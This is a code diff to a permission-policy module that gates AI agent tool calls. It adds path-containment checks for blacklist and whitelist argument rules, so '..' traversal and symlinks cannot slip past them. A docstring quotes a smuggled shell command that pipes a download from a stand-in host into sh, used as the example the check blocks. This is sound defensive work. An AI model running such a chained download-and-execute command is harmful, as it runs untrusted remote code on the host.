@@ -23,6 +23,7 @@ from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Callable, Dict, List, Optional, Set
 
+from .argument_paths import is_path_argument, path_rule_allows, path_rule_denies
 from .evaluator import EvalContext, EvalResult, PolicyDecision as EvalDecision, load_evaluators, run_evaluator
 from .sanitization import (
     SanitizationConfig,
@@ -145,6 +146,10 @@ class PermissionPolicy:
     # Sanitization configuration (None = disabled)
     sanitization_config: Optional[SanitizationConfig] = None
     cwd: Optional[str] = None  # Working directory for path checks
+    # Base for relative PATH argument rules (#1578) when ``cwd`` is unset:
+    # the session's workspace, which is what file tools resolve a relative
+    # ``path`` against.  Set by the plugin after ``from_config``.
+    path_base: Optional[str] = None
 
     # Permission evaluators (tool_name|"default" -> evaluate callable)
     _evaluators: Dict[str, Callable] = field(default_factory=dict)
@@ -496,22 +501,69 @@ class PermissionPolicy:
                 )
 
         # Check argument blacklist
-        if tool_name in self.blacklist_arguments:
-            arg_rules = self.blacklist_arguments[tool_name]
-            for arg_name, blocked_values in arg_rules.items():
-                arg_value = args.get(arg_name, "")
-                # For string arguments, check if it starts with any blocked value
-                if isinstance(arg_value, str):
-                    for blocked in blocked_values:
-                        if arg_value.startswith(blocked) or blocked in arg_value.split():
-                            return PolicyMatch(
-                                decision=PermissionDecision.DENY,
-                                reason=f"Argument '{arg_name}' contains blocked value: {blocked}",
-                                matched_rule=f"{arg_name}={blocked}",
-                                rule_type="blacklist"
-                            )
+        for arg_name, blocked in self._argument_rule_hits(
+                self.blacklist_arguments, tool_name, args, self._argument_blocked):
+            return PolicyMatch(
+                decision=PermissionDecision.DENY,
+                reason=f"Argument '{arg_name}' contains blocked value: {blocked}",
+                matched_rule=f"{arg_name}={blocked}",
+                rule_type="blacklist"
+            )
 
         return None
+
+    @property
+    def _path_rule_base(self) -> Optional[str]:
+        """Directory a relative path argument and rule are resolved against."""
+        return self.cwd or self.path_base
+
+    @staticmethod
+    def _argument_rule_hits(rules, tool_name, args, predicate):
+        """Yield ``(arg_name, rule_value)`` for each rule ``predicate`` accepts.
+
+        ``rules`` is the ``{"<tool>": {"<arg>": [values]}}`` table; only
+        string argument values are judged, as before.
+        """
+        for arg_name, values in (rules.get(tool_name) or {}).items():
+            arg_value = args.get(arg_name, "")
+            if not isinstance(arg_value, str):
+                continue
+            for rule_value in values:
+                if predicate(tool_name, arg_name, arg_value, rule_value):
+                    yield arg_name, rule_value
+
+    def _argument_blocked(self, tool_name, arg_name, arg_value, blocked) -> bool:
+        """Blacklist test for one argument rule.
+
+        The string test (prefix, or a whole word of the value) always
+        applies.  A PATH argument (#1578) is ALSO denied when it lies inside
+        the rule after normalisation or symlink resolution, so
+        ``a/../secret`` is caught by a rule on ``secret`` — normalisation
+        only ever widens a deny.
+        """
+        if arg_value.startswith(blocked) or blocked in arg_value.split():
+            return True
+        return is_path_argument(arg_name) and path_rule_denies(
+            arg_value, blocked, self._path_rule_base)
+
+    def _argument_allowed(self, tool_name, arg_name, arg_value, allowed) -> bool:
+        """Whitelist test for one argument rule.
+
+        A PATH argument (#1578) is allowed only when it lies inside the rule
+        by path component, both lexically (``..`` collapsed) and after
+        symlink resolution: ``out/../x`` and the sibling ``out2`` do not
+        match a rule on ``out``.  Any other argument keeps the string-prefix
+        test; on a shell tool a prefix must not smuggle shell operators past
+        the allowed text — ``command`` startswith ``python`` can't
+        green-light ``python x; curl evil|sh``.  The operator writes the
+        operator into the prefix to authorize it.
+        """
+        if is_path_argument(arg_name):
+            return path_rule_allows(arg_value, allowed, self._path_rule_base)
+        if not arg_value.startswith(allowed):
+            return False
+        return not (tool_name in _SHELL_EXECUTING_TOOLS
+                    and _has_uncovered_shell_control(arg_value, allowed))
 
     def _check_whitelist(
         self, tool_name: str, args: Dict[str, Any], signature: str
@@ -544,29 +596,15 @@ class PermissionPolicy:
                     rule_type="whitelist"
                 )
 
-        # Check argument whitelist
-        if tool_name in self.whitelist_arguments:
-            arg_rules = self.whitelist_arguments[tool_name]
-            for arg_name, allowed_values in arg_rules.items():
-                arg_value = args.get(arg_name, "")
-                if isinstance(arg_value, str):
-                    for allowed in allowed_values:
-                        if arg_value.startswith(allowed):
-                            # A prefix-whitelisted command on a shell tool must
-                            # not smuggle shell operators past the allowed
-                            # prefix — ``command`` startswith ``python`` can't
-                            # green-light ``python x; curl evil|sh``.  The
-                            # operator writes the operator into the prefix to
-                            # authorize it (mirrors the glob path above).
-                            if (tool_name in _SHELL_EXECUTING_TOOLS
-                                    and _has_uncovered_shell_control(arg_value, allowed)):
-                                continue
-                            return PolicyMatch(
-                                decision=PermissionDecision.ALLOW,
-                                reason=f"Argument '{arg_name}' matches allowed value: {allowed}",
-                                matched_rule=f"{arg_name}={allowed}",
-                                rule_type="whitelist"
-                            )
+        # Check argument whitelist (#1578: path arguments by containment)
+        for arg_name, allowed in self._argument_rule_hits(
+                self.whitelist_arguments, tool_name, args, self._argument_allowed):
+            return PolicyMatch(
+                decision=PermissionDecision.ALLOW,
+                reason=f"Argument '{arg_name}' matches allowed value: {allowed}",
+                matched_rule=f"{arg_name}={allowed}",
+                rule_type="whitelist"
+            )
 
         return None
 
